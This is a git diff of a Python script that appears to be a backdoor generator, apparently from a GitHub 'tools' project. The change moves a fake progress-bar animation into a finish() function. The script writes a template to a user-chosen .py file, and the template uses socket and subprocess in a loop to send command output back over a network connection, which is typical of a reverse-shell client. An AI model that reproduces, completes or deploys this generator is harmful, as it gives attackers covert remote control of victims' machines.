@@ -47,9 +47,25 @@ def banner():
                         -------------------
 
 Visit https://github.com/grenoxx For More Tools:""")
-banner()
-file_name = input("[!] Insert a file name.py: ")
-arq = open(file_name, 'w')
+
+def finish():
+    print ("[*] Generating...")
+    os.system("clear")
+    print ("1%")
+    time.sleep(1.9)
+    os.system("clear")
+    print ("15%")
+    time.sleep(1.9)
+    os.system("clear")
+    print ("30%")
+    time.sleep(1.9)
+    os.system("clear")
+    print ("50%")
+    time.sleep(1.9)
+    os.system("clear")
+    print ("100%")
+    time.sleep(3)
+    
 temp = """
 import socket
 import subprocess
@@ -73,23 +89,10 @@ while True:
     print("[-] Sending response...")
     client.send(output + output_error)
 """
-
-print ("[*] Generating...")
-os.system("clear")
-print ("1%")
-time.sleep(1.9)
-os.system("clear")
-print ("15%")
-time.sleep(1.9)
-os.system("clear")
-print ("30%")
-time.sleep(1.9)
-os.system("clear")
-print ("50%")
-time.sleep(1.9)
-os.system("clear")
-print ("100%")
-time.sleep(3)
+banner()
+file_name = input("[!] Insert a file name.py: ")
+arq = open(file_name, 'w')
+finish()
 arq.write(temp + "\n")
 os.system("clear")
 print ("[*] Finish!!!")
